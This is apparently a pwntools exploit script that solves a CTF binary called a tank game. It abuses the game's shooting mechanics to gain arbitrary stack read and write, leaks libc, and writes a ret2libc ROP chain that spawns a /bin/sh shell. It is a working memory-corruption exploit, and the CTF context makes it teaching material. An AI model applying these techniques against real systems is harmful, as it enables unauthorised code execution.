from pwn import *
import warnings
import math

warnings.simplefilter("ignore", category=BytesWarning)
context.update(os = "linux", arch = "amd64")
elf = context.binary = ELF("./super-sick-tank-game-bonus")
libc = elf.libc

if args.REMOTE:
	p = remote("127.0.0.1", 12345)
else:
	p = elf.process()

# receive the firing range buffer from the game
def recv_firing_range():
	p.recvuntil(b'|"""\\-=  ')
	return p.recv(0x70)

# communicate with the game to shoot for one turn
def shoot(power, angle, command = b"pew!", ammo_type = 1):
	if len(p.recvuntil(b"2: -", timeout=1)) > 0:	# select an ammo type if asked to
		p.sendline(str(ammo_type))
	p.sendlineafter(b"power:", str(power))
	p.sendlineafter(b"angle:", str(angle))
	p.recvuntil(b"x = ")
	target = p.recvuntil(b" meters", drop = True)
	p.sendlineafter(b"ready!", command)
	if (command != b"pew!"):
		p.sendline(b"pew!")	# send the final fire command to trigger firing
	missed = False
	if b"missed" in p.recvuntil(b"!"):
		missed = True
	log.info("Shooting at x = %d - %s" % (int(target.decode()), "missed" if missed else "hit"))

# calculate power to hit target_x with angle 45
# formula: x = floor(power * power * sin(2*angle) / g)
# x = [p^2/g]
# x <= p^2/g < x+1
# gx <= p^2 < g(x+1)
# sqrt(gx) <= p < sqrt(g(x+1))
# Thus, we will return the average of sqrt(gx) and sqrt(g(x+1))
def calc_power(target_x):
	return (math.sqrt(9.81 * target_x) + math.sqrt(9.81 * (target_x + 1))) / 2.0

# score a hit by shooting an enemy
def shoot_enemy():
	firing_range = recv_firing_range()
	target_x = firing_range.index(b"E")
	power = calc_power(target_x)
	shoot(power, 45)

shoot_enemy()
shoot_enemy()
shoot_enemy()	# shoot 3 enemies to get a special shot
shoot(0, 0, ammo_type = 2)	# overwrite MSB of max_angle
shoot_enemy()
shoot_enemy()
shoot_enemy()
shoot(33, 45, ammo_type = 2)	# overwrite LSB of max_power
shoot_enemy()
shoot_enemy()
shoot_enemy()
shoot(calc_power(0x71), 45, ammo_type = 2)	# make max_power even bigger

# Now we can shoot almost anywhere on the stack!
# we can also shoot with an angle of 135 to shoot backwards!

# change number of misses to anything more than 5 and we will never lose!
shoot(calc_power(0x1bc - 0x90), 135)

# change max index of ammo character to be able to select arbitrary ammo chars from the firing command buffer
shoot(calc_power(0x1a8 - 0x90), 135)

shoot(calc_power(0x17c - 0x90 - 1), 135)	# get many special shots

# write an arbitrary byte at an offset from stack-0x90
def arb_write(offset, what):
	shoot(0, 0, command = b"pew!--" + bytes([what]), ammo_type = 1)	# get our byte into memory
	shoot(calc_power(abs(offset)), (45 if offset >= 0 else 135), ammo_type = 9)	# select our byte as the ammo char and shoot!

# read a byte at an arbitrary non-negative offset from stack-0x1a
def arb_read(offset):
	shoot(0, 0, ammo_type = offset + 1)	# shoot the value into the firing range buffer to make it get printed next turn
	return recv_firing_range()[0]

# gdb.attach(p, gdbscript="b *0x401a9b")
# pause()

# reading the return address of main() to leak libc addresses
libc_leak = 0
for i in range(6):
	libc_leak |= arb_read(0x1a + 0x10 + i) << (8 * i)
libc.address = libc_leak - 0x29d90
log.info("libc base = " + hex(libc.address))

# ret2libc payload
payload = p64(libc.address + 0x2a3e5)	# pop rdi; ret
payload += p64(next(libc.search(b"/bin/sh\0")))
payload += p64(0x401a9b)	# ret gadget to avoid segfault in system()
payload += p64(libc.sym["system"])

# write the ret2libc payload on stack
for i in range(len(payload)):
	arb_write(0x90 + i, payload[i])

arb_write(0x90 - 0x1bc, 4)	# end the game loop

p.interactive()
